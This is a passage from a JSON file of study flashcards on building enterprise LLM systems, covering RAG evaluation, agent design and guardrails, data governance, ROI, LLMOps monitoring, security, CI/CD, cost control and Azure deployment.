    { "front": "What are the three metrics of the \"RAG triad,\" and what does faithfulness specifically detect?", "back": "Context relevance/utilization, faithfulness (groundedness), and answer relevancy. Faithfulness is the hallucination detector: the fraction of the answer's claims actually supported by the retrieved context — a correct-but-unsupported answer should still score low." },
    { "front": "When using LLM-as-judge for RAG evaluation, what precautions keep the scores trustworthy?", "back": "Validate judge scores against human ratings, use a strong *separate* judge model (not the same model that generated the output, to avoid shared blind spots), and watch for known biases toward longer/more confident answers and position bias." },
    { "front": "What makes up a RAG \"golden set,\" and what kind of case must it deliberately include?", "back": "A curated set of (question, ideal answer, and ideally the IDs of relevant chunks), ~50 to start and 100–200+ for stability. It must deliberately include questions your corpus *cannot* answer, to test the \"I don't know\" behavior." }
  ],
  "m4l7": [
    { "front": "What is the single most common mistake when troubleshooting a RAG system, and what should you do instead?", "back": "Tuning generation prompts when the real problem is retrieval. Always diagnose retrieval first — inspect the retrieved chunks before they reach the LLM." },
    { "front": "What is the cheapest-first triage order for diagnosing a failing RAG query?", "back": "(1) Is the content even in the vector store? (2) Did the right chunk get retrieved in top-K? (3) Do ingestion and query use the same embedding model/version? (4) Is an access pre-filter hiding it? (5) Only then suspect generation. Each step rules out a whole class of cause." },
    { "front": "After inspecting retrieval, how do you distinguish a retrieval problem, a generation problem, and a data gap?", "back": "Relevant chunks NOT in the retrieved results = retrieval problem; relevant chunks ARE retrieved but the answer is wrong = generation problem; the information isn't in the corpus at all = data gap (no tuning helps, you must add content)." },
    { "front": "If the model says \"I don't know\" even though the answer IS in the retrieved context, what are the likely fixes?", "back": "The answer is probably buried by context length (lost-in-the-middle). Move the most relevant chunk to the beginning, reduce context length, or increase top-K." }
  ],
  "m5l1": [
    { "front": "What single trait most distinguishes an AI agent from a one-shot LLM call?", "back": "Non-determinism in *control flow*: the model itself decides what to do next at each step — which tool to call and when to stop — rather than the developer pre-wiring every branch." },
    { "front": "Distinguish a chain, a workflow, and an agent by who controls the path.", "back": "A chain is a fixed developer-hardcoded sequence of LLM calls. A workflow is a graph with conditional edges where the developer defines every possible path and the LLM picks the branch. An agent has no fixed graph — the model decides each step and when it's done." },
    { "front": "The LLM is stateless and doesn't persist between turns, so where does an agent's \"agency\" actually live?", "back": "In your harness/loop code: it sends the full history plus tool catalog to the model, executes any tool calls, appends results, and re-invokes. Every turn is a fresh model call re-reading the entire scratchpad — there is no persistent agent process." },
    { "front": "Why is the max-turns cap considered a non-negotiable stop condition even when other stop conditions work?", "back": "It's the safety net against runaway loops. On hitting it the agent should return a clear \"did not finish\" message — never silently present a partial answer as final." },
    { "front": "When should you choose Plan-and-Execute over plain ReAct, and when does it backfire?", "back": "Use Plan-and-Execute for long-horizon tasks where upfront planning matters (research, multi-doc analysis). It backfires when intermediate results genuinely change what should happen next, since a rigid pre-baked plan becomes wrong — use replan or ReAct instead." }
  ],
  "m5l2": [
    { "front": "When a model \"calls a function,\" what does it actually emit, and who executes the function?", "back": "The model only generates a structured JSON block naming a tool and its arguments — it cannot execute anything. Your harness parses that JSON, runs the real function, and feeds the result back in the next request." },
    { "front": "Why does function calling \"almost always\" produce structurally valid JSON arguments?", "back": "Providers use constrained decoding — logit masking and grammar-constrained sampling compiled from your JSON Schema — so tokens that would violate the schema are never sampled. This eliminates structural errors but not semantic ones (the model can still pick a wrong-but-valid value)." },
    { "front": "Why should a tool return errors as a tool_result with is_error:true rather than throwing an exception to the loop?", "back": "The model can see and recover from an error returned as a tool result, but it cannot recover from your harness crashing. A structured, actionable error (with a suggested_action) lets the model self-correct." },
    { "front": "Advertising 20 tools costs roughly 5K tokens per turn. What is the single biggest mitigation for tool-list overhead?", "back": "Prompt caching: mark the tools+system block as cached so you pay full price once, then a fraction on every subsequent turn of the conversation. Dynamic tool sets and hierarchical meta-tools help too." },
    { "front": "What does the tool_choice setting \"tool\" (named/forced) enable beyond agentic use?", "back": "It's the most reliable way to get structured JSON output: define one tool whose schema is your desired output shape, force that tool, and ignore the agentic loop — the model is compelled to emit data matching that schema." }
  ],
  "m5l3": [
    { "front": "Name the three conditions that genuinely justify a multi-agent system over a single well-designed agent.", "back": "(1) Specialization pays — subtasks need distinct tools/prompts/models; (2) parallelism helps — independent subtasks cut wall-clock time; (3) independent verification matters — a separate agent checks the generator without bias. If none apply, use one agent." },
    { "front": "What is a \"handoff\" between agents, mechanically, and what's the lazy default to avoid?", "back": "A handoff is just moving state from one agent's context into another's. The lazy default is dumping full conversation history everywhere, which blows up token cost and dilutes attention; instead pass a tight, purpose-built payload and return a distilled result." },
    { "front": "Beyond specialization, what is often the biggest *real* benefit of splitting work across sub-agents?", "back": "Context isolation: each subtask gets a fresh, clean context window instead of one agent polluting its own context with raw results, dead ends, and errors. Split where intermediate work is voluminous but the result is compact." },
    { "front": "Most multi-agent failures occur \"between\" agents — give two such failure modes and their antidotes.", "back": "Error compounding (an early mistake becomes trusted downstream input) — antidote: validate handoffs and have downstream agents sanity-check inputs. Conflicting outputs (two agents disagree with no arbiter) — antidote: designate one synthesizer/judge to own the final answer." }
  ],
  "m5l4": [
    { "front": "If each agent step is 95% reliable, what is the approximate end-to-end reliability over 10 steps, and what two lessons follow?", "back": "About 60% (0.95^10). Lessons: (1) fewer steps is multiplicatively safer; (2) since you can't make a step perfect, guardrails must *recover* from errors — validate, retry, catch — not just block bad actions." },
    { "front": "What are the three layers of agent guardrails and what does each one bound?", "back": "Input guardrails control what *enters* (sanitize, screen injection, auth). Action/tool guardrails control what's *possible* (least-privilege scopes, sandboxing, spend caps) — the most important layer, bounding the worst case. Output guardrails control what *leaves* (schema-check, redact PII, gate risky actions)." },
    { "front": "When should a guardrail be deterministic code versus an LLM-based guard model?", "back": "Use deterministic code for hard limits that actually matter — security, money, irreversible actions, data access — because it's fast and can't be argued out of by an injection. Use an LLM guard for fuzzy judgment (toxicity, off-topic, jailbreak detection), accepting it's probabilistic and itself attackable." },
    { "front": "Why is least privilege called the strongest guardrail and the direct answer to prompt injection?", "back": "It's structural, not probabilistic: the agent cannot do what it cannot reach. You can't guarantee the model won't be tricked into *trying* something harmful, but scoped tools and read-only/minimum-scope credentials guarantee it lacks the access to *succeed*." },
    { "front": "What rule determines how much autonomy (L0–L4) to grant an agent action?", "back": "Autonomy should scale inversely with reversibility × blast-radius. Reversible low-impact actions can run autonomously (L3/L4); irreversible high-impact ones (wiring money, deleting records) stay at approve-each (L1) regardless of test performance. Earn higher autonomy empirically from eval and audit data." }
  ],
  "m5l5": [
    { "front": "What three properties make agents harder to evaluate than a single LLM call?", "back": "They're stochastic (same input, different runs, so single-run assertions are flaky), multi-step (success is a trajectory of decisions, not one output), and path-dependent with many valid solutions (so exact-match grading breaks)." },
    { "front": "Why must you evaluate both outcome and trajectory, not just the final answer?", "back": "Outcome eval checks the end state is right; trajectory eval checks the path was sensible and safe. An agent can return the correct answer but reach it by deleting and recreating a record (passes outcome, fails process — a latent disaster), or follow a perfect plan but time out (passes process, fails outcome)." },
    { "front": "How do you make a stochastic, multi-step agent testable enough for CI?", "back": "Assert on properties/invariants (which tools were called, step budget, forbidden tools) not exact strings; require a pass-rate over K runs (e.g. 9/10) rather than a single pass; mock the environment for determinism; and pin temperature 0 and the model version." },
    { "front": "What does an agent eval *scenario* specify, and why run it against mocked tools?", "back": "A scenario specifies an initial (mocked) state, the goal/input, the expected trajectory (tools that should and shouldn't be called), and success criteria. Mocked tools return fixed responses so the test is deterministic, fast, offline, and never touches real systems." }
  ],
  "m5l6": [
    { "front": "What turns a stateless tool-caller into a coherent agent, and what determines which architecture to use?", "back": "Memory — the ability to retain conversation history, user preferences, mentioned entities, and in-progress tasks across stateless API calls. The right memory architecture depends on the use case (conversation length, entity tracking, cross-session needs)." },
    { "front": "Contrast buffer, window, and summary memory by their core tradeoff.", "back": "Buffer stores full history (complete context, but token cost grows until it hits the context limit). Window keeps only the last N messages (fixed cost, but forgets earlier context and can contradict itself). Summary compresses older turns via an LLM (fixed cost retaining key facts, but can lose detail and adds latency)." },
    { "front": "For a multi-step workflow with structured progress, why prefer explicit workflow state over conversation memory?", "back": "Use an explicit typed state schema (e.g. LangGraph's TypedDict) updated at each step. The state is inspectable, serializable, and the source of truth; the conversation becomes a side effect of the workflow rather than what you reason over." },
    { "front": "What is the highest-severity memory failure mode and its required antidote?", "back": "Cross-user/cross-tenant leakage — one user's memories surfacing in another's session, which is a breach, not a glitch. Antidote: partition every long-term memory store by user/tenant ID and pre-filter on it for every retrieval." }
  ],
  "m5l7": [
    { "front": "In orchestration vs agency, who owns control flow, and why is a workflow preferred for enterprise tasks?", "back": "In a pure agent the *model* owns control flow; in an orchestrated workflow *you* own it in code as a graph, with the LLM as just one node. Code-defined flow is deterministic, testable, auditable, and resumable in ways a free-running agent loop is not." },
    { "front": "What is the production stance on how much control to give the model in a workflow?", "back": "Make the workflow as deterministic as the problem allows, and reserve model-driven agency only for the nodes that genuinely need open-ended decisions. Many struggling \"agent\" projects are really workflows that handed too much control to the model." },
    { "front": "How does checkpointing make a long-running workflow survive crashes, and what does it require of the state?", "back": "After each node completes, the framework serializes the entire state to a durable store keyed by a thread/run ID; on resume it loads the last checkpoint and continues from the *next* node. This requires the state to be serializable — no live connections or unpicklable objects." },
    { "front": "Why do durable workflows need idempotency and the saga (compensation) pattern?", "back": "Resumption is at-least-once, so a node can re-run after a crash — a non-idempotent action like \"charge the card\" could double-bill, so side effects need idempotency keys. When a multi-step process partially completes then fails, sagas pair each forward action with a compensating action (cancel the order, release inventory) run in reverse to undo it." }
  ],
  "m6l1": [
    { "front": "Why are the five enterprise AI patterns best understood as a single axis rather than five separate things?", "back": "They're mostly ordered by *how much the AI acts without a human* (autonomy levels L0–L4). Copilot is L0–L1, knowledge/decision support L1–L2, automation L2–L3, autonomous agents L3–L4." },
    { "front": "What is the single most-cited cause of failed enterprise AI initiatives, and why does it fail mechanically?", "back": "Skipping the maturity ladder to jump straight to autonomous agents. Each earlier stage builds prerequisites the next silently depends on: clean/governed data, evaluation capability, organizational trust, and change-management experience." },
    { "front": "State the build-vs-buy-vs-configure rule and when each option fits.", "back": "*Buy the commodity, configure the common case, build only your differentiator.* Buy off-the-shelf for generic productivity; configure a platform with your data for standard RAG/workflows; build custom only for what is your competitive moat." },
    { "front": "Which concrete dimensions should you score a candidate project on to pick a pattern?", "back": "Autonomy required, reversibility × blast-radius, data readiness, value type (productivity/cost/satisfaction/decision quality), and time-to-value/build complexity. Score these five and the right pattern usually picks itself." },
    { "front": "If your data is scattered and dirty, why isn't a knowledge-management project really an AI project?", "back": "Patterns 2–5 live or die on data quality and access, so a knowledge or decision-support project on bad data is a *data project first* — ignoring this turns a 3-month effort into an 18-month one." }
  ],
  "m6l2": [
    { "front": "Why can a copilot that's right 50% of the time be net-negative in value?", "back": "A wrong suggestion isn't neutral — it costs the user time to read, judge, and dismiss. The review tax on the bad half can eat the time saved on the good half, so precision beats coverage." },
    { "front": "What is acceptance rate for a copilot, and what thresholds indicate health vs. trouble?", "back": "Accepted-or-lightly-edited suggestions ÷ total suggestions, tracked per task type. Above ~60% is healthy; below ~30% means the copilot is creating work rather than saving it, so narrow its scope." },
    { "front": "Why is trust, not model capability, the usual reason copilots fail to gain adoption?", "back": "Adoption is non-linear: a few bad early suggestions make users permanently file the tool as unreliable and tune it out. Later model improvements go unnoticed. So you must earn trust before asking for it — start narrow, make dismissal effortless, show confidence/reasoning." },
    { "front": "Contrast over-suggestion with automation bias as copilot failure modes.", "back": "Over-suggestion (the Clippy problem) interrupts users with low-value unsolicited suggestions. Automation bias is the opposite and more dangerous: users over-trust and rubber-stamp suggestions, letting the copilot's errors slip through unchecked." },
    { "front": "When a user edits rather than accepts a copilot suggestion, why is that edit valuable?", "back": "The corrected value is a free label: it becomes a new precedent fed back into the RAG store so the next similar suggestion is better, and rejections-with-reasons become your eval set." }
  ],
  "m6l3": [
    { "front": "What is a confidence threshold in process automation, and what happens if it's set too high or too low?", "back": "It's the per-item gate deciding auto-process vs. escalate to a human. Too high → almost everything escalates (low straight-through rate, little ROI); too low → errors slip through unreviewed (high throughput, unacceptable error rate)." },
    { "front": "How should you calibrate an automation confidence threshold rather than guessing it?", "back": "On a labeled eval set, measure accuracy at each confidence level, then pick the lowest threshold where auto-processed accuracy still meets your error budget (e.g. 99.5% correct). The threshold is read off your own accuracy-vs-confidence curve." },
    { "front": "Why does process automation still need a deterministic rules engine even with a capable LLM?", "back": "Automation acts without a human on every item, so there's no reviewer to catch mistakes. The LLM extracts the fuzzy data; deterministic code (structural, cross, reference, and business-rule checks) decides whether it's *safe to act*." },
    { "front": "What is straight-through processing (STP) rate, and why is the exception queue 'the product'?", "back": "STP is the fraction of items handled with zero human touch. In automation humans review only exceptions, so the exception queue is where the human work now lives — design it first, make exceptions fast to resolve, and watch a rising queue as an early drift warning." },
    { "front": "Why shouldn't you trust an LLM's self-reported 'high confidence' when setting automation thresholds?", "back": "Confidence can be miscalibrated — the model reports high confidence while being wrong, letting errors through. Trust *measured* accuracy-at-confidence from your eval set instead, and recalibrate periodically." }
  ],
  "m6l4": [
    { "front": "What is the cardinal access-control rule for a knowledge-management RAG system, and how is it enforced?", "back": "The AI must never surface content the user couldn't already see in the source system. Enforced by storing each document's ACL as chunk metadata and applying a pre-filter built from the current user's identity/groups before vector search runs." },
    { "front": "Why is late binding of permissions important in an access-controlled RAG system?", "back": "Permissions must be checked at *query* time against current group membership, not only at ingestion, so that a revoked access takes effect immediately rather than leaking via stale ACLs." },
    { "front": "Why is the deletion problem the most-missed requirement in a knowledge-management ingestion pipeline?", "back": "When a source document is deleted *or its permissions revoked*, its chunks must leave the index immediately — otherwise the AI keeps answering from content that no longer exists or that the user lost access to. This requires tracking source→chunk lineage." },
    { "front": "Why should a knowledge bot be designed to say 'I don't know,' and why are citations non-negotiable?", "back": "A confident wrong or stale answer destroys trust (and a wrong HR/policy answer can create liability); admitting a gap is more trustworthy than hallucinating. Citations let users *verify* rather than blindly trust and make a wrong answer traceable to a bad source." },
    { "front": "For high-sensitivity data, what's the tradeoff between one index with per-user filters versus separate indexes per security boundary?", "back": "One filtered index is flexible but a single filter bug can leak everything; separate indexes per security boundary give safer isolation at the cost of more to manage. High-sensitivity tenants often choose separation." }
  ],
  "m6l5": [
    { "front": "In decision support, why is explainability the central requirement rather than a nice-to-have?", "back": "The human owns the accountability, so a recommendation they can't understand is one they can't responsibly act on — and in regulated domains (credit, hiring, healthcare) a black-box decision is illegal." },
    { "front": "Contrast SHAP/feature attribution with an LLM-generated explanation, and what's the robust pattern?", "back": "SHAP is faithful to the model — it attributes the prediction to actual input features. An LLM narration is a readable but post-hoc story that may not reflect the real reasoning. The robust pattern: compute real drivers with SHAP, then have the LLM narrate those specific attributions." },
    { "front": "What does it mean for a model to be *calibrated*, and why can an accurate model still mislead a decision-maker?", "back": "Calibrated means that across all the times it outputs 0.8, the event happens ~80% of the time. A model can rank cases correctly (accurate) yet be miscalibrated (its 0.8 behaves like 0.6), so a human acting on face value systematically over-trusts it." },
    { "front": "What is decision laundering, and how does it differ from ordinary automation bias?", "back": "Automation bias is users over-trusting and rubber-stamping a recommendation. Decision laundering is the darker version: the org uses the human's sign-off as accountability cover for an AI decision nobody really scrutinized — responsibility is assigned but practically absent." },
    { "front": "Why is an override rate near 0% a warning sign in a decision-support system?", "back": "It signals rubber-stamping (or that the AI has quietly replaced the human). A very high rate signals no trust or a bad model. Reasoned overrides in a healthy middle range are the goal." },
    { "front": "What is the counterfactual gap in measuring decision quality, and how do you mitigate it?", "back": "You only observe the outcome of the path *taken* — if an officer overrode 'deny' and approved, you never learn what the denial would have yielded, so outcome logs are censored. Mitigate with champion-challenger or controlled A/B tests on lower-stakes slices." }
  ],
  "m6l6": [
    { "front": "What five conditions must ALL hold before an autonomous agent is appropriate?", "back": "A well-defined workflow, a bounded action space, reversible/low-cost errors, observable outcomes, and a gradual rollout path. Missing any one means full autonomy is premature." },
    { "front": "What is the mental model for an enterprise autonomous agent's architecture?", "back": "The LLM agent is a small, capable, *untrusted* engine at the center; the surrounding layers — pre-screening router, bounded core with allow-lists and caps, post-action validation, escalation paths, and observability — are what make it safe to run unattended." },
    { "front": "Describe the shadow → canary → scale rollout for an autonomous agent, and why shadow mode matters.", "back": "Shadow: the agent decides on real cases but a human/process still acts, giving risk-free in-production accuracy. Canary: route 5–10% of real traffic and measure vs. baseline. Then progressively expand, gated on metrics, with an auto-revert seatbelt if quality drops." },
    { "front": "Which two cost terms make an autonomous agent's business case fail, beyond token/infra cost?", "back": "Escalation cost (a case the agent half-handles then punts can cost more than if a human took it from the start) and error cost at scale (refunds, churn, remediation). An agent that resolves 50% but makes the other 50% messier can be net-negative." },
    { "front": "Under what conditions does autonomy actually pay, and what's the alternative when they don't hold?", "back": "Autonomy pays at high volume, high auto-resolution rate, low error cost, and bounded escalation cost. At low volume a copilot usually delivers more value for far less risk — 'can we build it?' and 'does it pay?' are different questions." }
  ],
  "m6l7": [
    { "front": "What are the four dimensions of 'data readiness,' and why does a gap in any one matter?", "back": "Accessible (can you get it programmatically?), Clean (deduplicated/parseable), Governed (known sensitivity and permissions), and Fresh (a pipeline keeps it current). A gap in any one turns the AI project into a data project first." },
    { "front": "Distinguish redaction from tokenization for handling PII before sending data to a model.", "back": "Redaction masks/removes PII (e.g. [NAME]) — simple and safe, but the model loses information. Tokenization replaces each value with a reversible placeholder (PERSON_1), lets the model work, then restores real values in the output — preserving utility while real data never reaches the provider." },
    { "front": "Why must PII never be put into fine-tuning data, and where should personal data live instead?", "back": "Data baked into weights via fine-tuning cannot be surgically removed — satisfying deletion would require retraining. Keep personal data in RAG (deletable) and out of weights (not deletable)." },
    { "front": "Why is 'delete my data' deceptively hard in an AI system, and what must a real deletion reach?", "back": "One person's data propagates beyond the source row into chunks, embeddings, prompt logs, response caches, and possibly fine-tuning data. A real deletion must cascade to source + derived chunks, the embeddings (which are PII too), and logs/caches under a retention policy." },
    { "front": "What is 'shadow AI,' and why does banning it without an alternative backfire?", "back": "Shadow AI is employees pasting confidential data into public chatbots because no sanctioned tool exists — the most common real-world leak. Banning without providing a governed alternative just drives the behavior underground; you must offer a sanctioned tool plus a clear policy." }
  ],
  "m6l8": [
    { "front": "Why must you measure a baseline *before* building an AI system, and what form should it take?", "back": "Without a 'before,' improvement is unprovable and 'it feels faster' won't survive a budget review. Capture a *distribution* (median, p90), not a point, plus current cost, volume, and error/quality rate — once you deploy, the pre-AI baseline is gone forever." },
    { "front": "Distinguish hard from soft ROI, and how do you defend soft ROI to finance?", "back": "Hard ROI is directly quantifiable (labor saved, errors avoided, revenue); soft ROI is real but hard to price (satisfaction, faster onboarding, decision quality). Defend soft ROI with measurable proxies (ticket deflection, time-to-find, override rate), a baseline, and a reported range rather than false precision." },
    { "front": "State the adoption equation and why it makes change management an ROI multiplier.", "back": "Value realized = potential value × adoption rate. A system that could save 10,000 hours saves zero if no one uses it, so adoption multiplies every ROI number — change management isn't soft fluff bolted on at the end." },
    { "front": "What is the productivity J-curve, and what's the practical implication for a pilot?", "back": "Output often dips before it rises — people are slower while learning the new tool, then surpass the old baseline once fluent. Budget for the dip, warn stakeholders, and don't kill a project during the trough." },
    { "front": "Why should a pilot be designed to *falsify* the business case, and what defines the 'perpetual pilot' failure?", "back": "A pilot that can only ever say 'yes' tells you nothing; it must be an experiment with pre-defined go/no-go criteria, a comparison, and a timebox. The perpetual pilot runs forever because nobody defined success, so it can neither graduate nor be killed." },
    { "front": "Why is 'measuring usage, not value' a pilot failure mode?", "back": "Vanity counts like '500 queries last week' say nothing about time saved or quality. Metrics must tie to the ROI equation — time saved and quality — not usage volume." }
  ],
  "m6l9": [
    { "front": "Which three deterministic-software assumptions does AI break, forcing different UX?", "back": "Same input → same output (AI is probabilistic, sometimes confidently wrong); low predictable latency (AI is slow and variable); errors are bugs to fix (AI is open-ended and inherently fallible). So the product *around* the model often decides success." },
    { "front": "What is calibrated trust, and what are its two opposite failure modes?", "back": "Users relying on the system exactly as much as it deserves. Over-trust (automation bias) — rubber-stamping outputs, worsened by polished UI reading as correctness; and under-trust — ignoring a good system so adoption collapses. The UI's job is to signal *when* to trust this answer." },
    { "front": "Why is streaming tokens the biggest perceived-latency win, and what metric does it elevate?", "back": "Output appears as it's generated at roughly reading speed, so a streamed 8-second answer feels better than a blank 3-second one. It makes time-to-first-token matter far more than total time." },
    { "front": "Contrast explicit and implicit feedback, and why is implicit often more honest?", "back": "Explicit is thumbs/ratings/report buttons — useful but sparse since most users never click. Implicit is what users *do* (copy, edit heavily, retry, abandon), which reflects real quality; every edit is a free label of what 'good' looked like for that case." },
    { "front": "Why is a blank chat box a poor default, and how do you fix the empty state?", "back": "It offers infinite possibility with zero guidance, so users freeze or type something handled badly. Fix by showing, not telling: seed example prompts/starter chips scoped to real strengths, offer templates, set capability expectations honestly, and use progressive disclosure." },
    { "front": "What makes a refusal or failure 'graceful' in AI UX?", "back": "Say 'I don't know' clearly (a grounded refusal beats a confident fabrication), always offer a path forward (rephrase, related results, or human escalation), never show raw errors, explain refusals briefly, and degrade gracefully on outages — an escape hatch to a human is the ultimate graceful failure." }
  ],
  "m7l1": [
    { "front": "Why is the model provider's quota — not your app servers — the scaling bottleneck for an LLM application?", "back": "Orchestration is cheap and stateless, but the model provider caps you at a tokens-per-minute (TPM) and requests-per-minute (RPM) quota. Once you hit that ceiling, requests get 429-throttled no matter how many app servers you add." },
    { "front": "When should you reserve provisioned throughput (PTU) instead of using pay-as-you-go API access?", "back": "Use PTU for steady, high volume that's latency-sensitive: it gives reserved capacity, predictable latency, and no noisy-neighbor throttling, at a higher fixed floor. Pay-as-you-go shares a quota pool and is cheaper at low or spiky volume." },
    { "front": "Name the four caching layers in an LLM app and what each one actually caches.", "back": "Exact-match response cache (full request hash → stored output), provider-side prompt caching (KV-cache reuse on a stable prefix), semantic cache (cached answer for a *similar* embedded query), and embedding cache (vectors keyed by content hash so text isn't re-embedded)." },
    { "front": "What is the danger of setting a semantic cache's similarity threshold too loose, and how do you mitigate it?", "back": "A too-loose threshold returns the *wrong* cached answer for a merely-similar query. Mitigate by tuning the threshold carefully and scoping the cache per user or tenant." },
    { "front": "Why must long-running agent jobs use an asynchronous/queued shape rather than a synchronous HTTP request?", "back": "A multi-minute agent behind a synchronous request (e.g. a 30s gateway) will time out — a top cause of gateway timeouts. Instead return a job ID, process in the background, and notify on completion." },
    { "front": "Why is exponential backoff for LLM retries paired with *jitter*?", "back": "Jitter randomizes retry timing so that many servers don't retry in lockstep after a 429 or 5xx, which would create a synchronized retry storm that hammers the recovering provider." }
  ],
  "m7l2": [
    { "front": "Why is standard DevOps monitoring (latency, error rate, CPU) insufficient for an LLM system?", "back": "A system can be perfectly 'healthy' — every request 200, great p99, zero exceptions — while the model confidently hallucinates. Infra metrics can't see output quality, so you must also monitor quality and user-behavior signals." },
    { "front": "What are the three layers of LLMOps signals, and what does each tell you?", "back": "Ops/system signals (latency, throughput, errors, cost) tell you if it's up and affordable; quality signals (faithfulness, hallucination, format compliance) tell you if it's correct; user/behavior signals (thumbs, completion, escalation) tell you if it's useful — and often warn earliest." },
    { "front": "Why is a trace, not a metric, the core primitive of LLMOps observability?", "back": "LLM bugs are qualitative ('why did it give that answer?'), which you can't diagnose from an aggregate chart. A trace is the replayable record of one request — exact prompt, retrieved context, every model/tool call, tokens, cost — so you can read what the model actually saw." },
    { "front": "Instead of full evaluation on every live request, how do you monitor production quality affordably?", "back": "Continuously *sample* quality, don't fully evaluate: judge a 1-5% random sample with an LLM-as-judge, watch cheap proxy signals (refusal rate, malformed JSON, retrieval hit rate, thumbs), and run periodic batch evals on logged traffic." },
    { "front": "Distinguish input drift, model drift, and concept drift in an LLM system.", "back": "Input/data drift: users ask new things your design didn't anticipate. Model drift: the provider silently updates a model (or you upgrade) and behavior shifts. Concept drift: the world changed (a policy or product updated) so old answers are now wrong." },
    { "front": "What's the rule for alerting on LLM signals to avoid alarm fatigue?", "back": "Alert on rates and trends, not single events — one bad response is noise, a 3x refusal-rate jump is signal — and wire critical drops to automated mitigation (fall back to a prior prompt/model or revert the canary) rather than only paging a human." }
  ],
  "m7l3": [
    { "front": "What does it mean to 'treat every model output as untrusted user input,' and why?", "back": "Model output flows into databases, shells, HTML, and URLs, so an attacker (via injection) can drive SQL injection, RCE, XSS, or SSRF one layer down. So you parameterize queries, sandbox code, escape rendered output, allow-list URLs/args, and validate against a schema before acting." },
    { "front": "What is the 'confused deputy' problem with an agent that has tools?", "back": "The agent acts with its *own* credentials on behalf of a user who may not hold them. If it can be steered (via prompt injection) to misuse that access, it becomes a privilege-escalation vector — reading or changing records the attacker never had rights to." },
    { "front": "Why should agent permission checks live in code rather than in the prompt?", "back": "The model can be talked out of a guideline but never out of an `if`. Since you can't stop an agent from being tricked, deterministic enforcement in code ensures it simply lacks the access to do harm when it is." },
    { "front": "What is 'excessive agency' and what controls limit it?", "back": "Excessive agency (an OWASP LLM risk) is giving an agent more capability, permission, or autonomy than the task needs. Controls: least privilege scoped to the requesting user, bounded/validated tools (no open-ended 'run any SQL'), human gates on consequential actions, and code-enforced permissions." },
    { "front": "Why is red-teaming necessary, and what should happen to each successful attack?", "back": "You can't prove an AI system secure by reading code — you probe it like an attacker (injection, jailbreaks, exfiltration, tool misuse). Every successful attack becomes a fixed, regression-tested case folded into the eval suite as a CI security gate." },
    { "front": "What controls protect the AI supply chain (models, data, packages, tools)?", "back": "Apply normal software hygiene (SBOMs, version pinning, dependency scanning) plus AI-specific provenance: pull models from trusted registries and verify checksums, vet/control data sources, treat ingested third-party content as untrusted, and sandbox third-party/MCP tools as least-privilege processes." }
  ],
  "m7l4": [
    { "front": "In AI CI/CD, what is the deployable and rollback-able unit, and why isn't it just 'the code'?", "back": "It's the (code, prompt, model, index) tuple. Changing any one — a one-word prompt tweak, a model version bump, a re-chunked index — changes behavior, so all four must travel through the pipeline and roll back together." },
    { "front": "How does an eval gate differ from a normal unit test, and how does it decide pass/fail?", "back": "It's statistical, not deterministic: you run a candidate against the eval set and gate on *aggregate* quality compared to the current production baseline (relative comparison controls for eval noise), requiring the overall metric to hold within a regression budget plus zero failures on must-pass critical cases." },
    { "front": "Why is a robust eval set the prerequisite for AI CI/CD?", "back": "The eval gate is what blocks a quality-degrading prompt or model change before it ships. Without a good eval set you have no gate, so every deploy is a guess." },
    { "front": "Why must a rollback revert the whole (code, prompt, model, index) tuple together?", "back": "A partial rollback — e.g. reverting the prompt but leaving a new model in place — ships a different, untested combination. Keep the previous full tuple one switch away so rollback restores a known-good system." },
    { "front": "What does a shadow deployment do that a canary doesn't?", "back": "A shadow deploy runs the new version on real requests *without* serving its output to users, comparing its decisions to the live one — zero-risk measurement before any exposure. A canary actually serves output to a small percentage of users." },
    { "front": "Why are prompts versioned outside application code and run through the eval suite on every change?", "back": "A prompt is production logic — a small wording change can swing quality across thousands of cases, and a prompt edited live in a console drifts with no diff, review, or rollback. Prompt regressions are silent and deadly, so every change triggers the eval gate." }
  ],
  "m7l5": [
    { "front": "Why do AI system costs surprise teams in ways traditional software costs don't?", "back": "Traditional cost scales with compute (predictable); AI cost scales with tokens (variable and user-dependent). A single verbose or adversarial user, a retry-triggering prompt, or a runaway agent loop can 10x spend in hours or minutes." },
    { "front": "What is cost attribution, and why is it the prerequisite for every other cost decision?", "back": "It's tagging every LLM call with dimensions you'll slice by — user/team/customer, feature/endpoint, model, request type — then aggregating. Without it an opaque '$40K bill' can't be acted on; with it you can pinpoint and route, cap, or price the expensive slice." },
    { "front": "Why is 'cost per business outcome' a better metric than total monthly tokens?", "back": "Total tokens is a vanity metric. Cost per outcome (per resolved ticket, per invoice) is directly comparable to value/ROI, normalizes for growth (rising spend is fine if cost-per-user is flat), sets a pricing floor, and catches unit-cost regressions the gross bill hides." },
    { "front": "What are the three levels of spend limits, and what does each prevent?", "back": "Per-request (max tokens/cost per call — stops runaway agent loops), per-user (daily/hourly cap — stops abuse and surprise bills), and system-wide (total daily spend — an emergency stop, typically 2-3x expected daily spend)." },
    { "front": "When a spend limit is hit, what should the system do instead of hard-failing?", "back": "Degrade gracefully: drop to a cheaper model, return a cached response, reduce RAG context, or queue the request for later — rather than returning a hard error." },
    { "front": "At org scale, why is a single shared API key a problem, and what does FinOps governance add?", "back": "A shared key is a tragedy of the commons — one team's experiment can blow the whole budget. Governance assigns accountability: per-team budgets/quotas at the gateway, chargeback/showback so cost is *theirs*, and approval for expensive model choices." }
  ],
  "m7l6": [
    { "front": "Why use Managed Identity instead of API keys for Azure AI services?", "back": "A Managed Identity gives a service an Azure AD identity that authenticates directly to Azure OpenAI, Search, and Key Vault with no secret to leak or rotate. It enforces the rule that secrets belong in neither prompts nor config; grant it least-privilege RBAC roles." },
    { "front": "What do private endpoints / VNet deployment provide for Azure OpenAI and AI Search, and why does it matter?", "back": "By default calls traverse public endpoints; private endpoints inside a virtual network keep traffic and data on Microsoft's backbone, never crossing the public internet. This is often exactly what data residency and security reviews require." },
    { "front": "Why does autoscaling Container App replicas do nothing for model throughput on Azure?", "back": "Compute and model quota scale separately. Adding replicas only scales orchestration; model throughput is governed by the Azure OpenAI TPM quota. Autoscaling compute into a fixed quota just yields more replicas all getting 429-throttled — scale it with PTUs or more regional deployments." },
    { "front": "What is the cold-start tradeoff of scale-to-zero on Azure Container Apps, and how do you handle it?", "back": "Scale-to-zero means the first request after idle is slow (5-10s cold start). Latency-sensitive services set a minimum warm replica count (minReplicas >= 1); only batch/background jobs should scale to zero." },
    { "front": "What three benefits does a multi-region Azure deployment provide at once?", "back": "Residency (deploy Azure OpenAI in the region the data must stay in), throughput (quota is per-region, so multiple deployments multiply the TPM ceiling), and failover (route around a throttled or down region via Azure Front Door / Traffic Manager)." },
